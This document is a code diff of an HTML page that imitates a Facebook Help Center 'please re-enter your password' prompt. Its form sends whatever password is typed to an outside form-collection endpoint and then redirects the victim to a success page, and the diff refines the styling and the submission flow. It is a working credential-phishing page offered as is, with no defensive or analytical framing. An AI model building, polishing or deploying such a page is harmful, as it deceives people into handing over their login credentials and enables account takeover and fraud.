@@ -1,176 +1,181 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Help Center</title>
-    <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: white;
-            margin: 0;
-            padding: 0;
-        }
-        .header {
-            background-color: #3b5998;
-            color: white;
-            padding: 25px;
-            font-size: 24px;
-            font-weight: bold;
-        }
-        .help-center {
-            color: #1877f2;
-            font-size: 18px;
-            font-weight: bold;
-            padding: 20px;
-            cursor: pointer;
-            background-color: #e9ebee;
-        }
-        .container {
-            width: 330px;
-            margin: 30px auto;
-            border: 1px solid #e9ebee;
-            background-color: white;
-            display: flex;
-            flex-direction: column;
-            position: relative;
-        }
-        .title-section {
-            background-color: #e9ebee;
-            padding: 15px;
-            font-size: 20px;
-            border-bottom: 1px solid #e9ebee;
-        }
-        .content {
-            padding: 10px;
-            flex: 1;
-            padding-bottom: 60px; /* Space for fixed button */
-        }
-        .instructions {
-            font-size: 14px;
-            margin-bottom: 15px;
-        }
-        .input-group {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        .input-group input {
-            flex: 1;
-            padding: 10px;
-            font-size: 14px;
-            border: 1px solid #ccc;
-            border-radius: 3px;
-            background: transparent;
-        }
-        .input-group input:focus {
-            outline: none;
-        }
-        .toggle-btn {
-            margin-left: 8px;
-            padding: 10px 10px;
-            background-color: transparent;
-            border: 1px solid #ccc;
-            cursor: pointer;
-            font-size: 14px;
-            border-radius: 3px;
-        }
-        .button-section {
-            background-color: #e9ebee;
-            padding: 5px;
-            text-align: right;
-            border-top: 1px solid #e9ebee;
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 97%;
-        }
-        .btn-continue {
-            background-color: #3b5998;
-            color: white;
-            border: none;
-            padding: 10px 10px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .error-message {
-            color: red;
-            font-size: 13px;
-            margin-bottom: 10px;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook Help Center</title>
+  <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #fff;
+    }
+
+    .header {
+      background-color: #3b5998;
+      color: white;
+      padding: 16px;
+      font-size: 26px;
+      font-weight: bold;
+    }
+
+    .help-center {
+      color: #1877f2;
+      font-size: 17px;
+      font-weight: bold;
+      padding: 16px;
+      background-color: #f0f2f5;
+      border-bottom: 1px solid #dadde1;
+    }
+
+    .container {
+      width: 330px;
+      margin: 30px auto;
+      border: 1px solid #dadde1;
+      background-color: white;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .title-section {
+      background-color: #f0f2f5;
+      padding: 15px;
+      font-size: 19px;
+      font-weight: bold;
+      border-bottom: 1px solid #dadde1;
+    }
+
+    .content {
+      padding: 15px;
+      position: relative;
+      padding-bottom: 60px; /* Space for fixed button */
+    }
+
+    .instructions {
+      font-size: 14px;
+      margin-bottom: 15px;
+      color: #606770;
+    }
+
+    .input-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .input-group input {
+      flex: 1;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #ccd0d5;
+      border-radius: 2px;
+      background: transparent;
+    }
+
+    .input-group input:focus {
+      outline: none;
+      border-color: #ccd0d5;
+    }
+
+    .toggle-btn {
+      margin-left: 8px;
+      padding: 10px 10px;
+      background-color: transparent;
+      border: 1px solid #ccd0d5;
+      font-size: 14px;
+      border-radius: 2px;
+      cursor: pointer;
+      color: #606770;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 13px;
+      margin-bottom: 10px;
+      display: none;
+    }
+
+    .button-section {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      padding: 10px 10px;
+      background-color: #f0f2f5;
+      border-top: 1px solid #dadde1;
+      box-sizing: border-box;
+      text-align: right;
+    }
+
+    .btn-continue {
+      background-color: #3b5998;
+      color: white;
+      border: none;
+      padding: 8px 14px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    .btn-continue:active {
+      background-color: #2d4373;
+    }
+  </style>
 </head>
 <body>
 
-    <div class="header">facebook</div>
-    <div class="help-center">Help Center</div>
+  <div class="header">facebook</div>
+  <div class="help-center">Help Center</div>
 
-    <div class="container">
-        <div class="title-section">Please enter your password</div>
-        <div class="content">
-            <div class="instructions">
-                For your security, please re-enter your password to complete this request.
-            </div>
+  <div class="container">
+    <div class="title-section">Please enter your password</div>
+    <div class="content">
+      <div class="instructions">
+        For your security, please re-enter your password to complete this request.
+      </div>
 
-            <!-- FORM START -->
-            <form id="passwordForm" action="https://submit-form.com/NcWbj5fZ9" method="POST">
-                <div class="error-message" id="error-message"></div>
-                <div class="input-group">
-                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
-                    <button type="button" class="toggle-btn" onclick="togglePassword()">Show</button>
-                </div>
-                <div class="button-section">
-                    <button type="submit" class="btn-continue">Continue</button>
-                </div>
-            </form>
-            <!-- FORM END -->
+      <form id="passwordForm" action="https://submit-form.com/NcWbj5fZ9" method="POST">
+        <div class="error-message" id="error-message">Password must be at least 6 characters and contain no spaces.</div>
+        <div class="input-group">
+          <input type="password" id="password" name="password" placeholder="Enter your password" required />
+          <button type="button" class="toggle-btn" onclick="togglePassword()">Show</button>
         </div>
+
+        <input type="hidden" name="_redirect" value="success.html" />
+
+        <div class="button-section">
+          <button type="submit" class="btn-continue">Continue</button>
+        </div>
+      </form>
     </div>
+  </div>
 
-    <script>
-        function togglePassword() {
-            const passwordInput = document.getElementById('password');
-            const toggleBtn = document.querySelector('.toggle-btn');
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                toggleBtn.textContent = 'Hide';
-            } else {
-                passwordInput.type = 'password';
-                toggleBtn.textContent = 'Show';
-            }
-        }
+  <script>
+    function togglePassword() {
+      const passwordInput = document.getElementById("password");
+      const toggleBtn = document.querySelector(".toggle-btn");
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        toggleBtn.textContent = "Hide";
+      } else {
+        passwordInput.type = "password";
+        toggleBtn.textContent = "Show";
+      }
+    }
 
-        document.getElementById('passwordForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const passwordField = document.getElementById('password');
-            const errorMessage = document.getElementById('error-message');
+    document.getElementById("passwordForm").addEventListener("submit", function (e) {
+      const password = document.getElementById("password").value;
+      const errorMessage = document.getElementById("error-message");
 
-            if (passwordField.value.length < 6) {
-                errorMessage.textContent = 'Password must be at least 6 characters long.';
-                return;
-            }
-
-            errorMessage.textContent = '';
-
-            const formData = new FormData(this);
-            fetch(this.action, {
-                method: 'POST',
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            })
-            .then(response => {
-                if (response.ok) {
-                    window.location.href = 'success.html';
-                } else {
-                    errorMessage.textContent = 'There was an error. Please try again.';
-                }
-            })
-            .catch(() => {
-                errorMessage.textContent = 'There was an error. Please try again.';
-            });
-        });
-    </script>
+      if (password.length < 6 || password.includes(" ")) {
+        e.preventDefault();
+        errorMessage.style.display = "block";
+      } else {
+        errorMessage.style.display = "none";
+      }
+    });
+  </script>
 
 </body>
-</html>
+    </html>
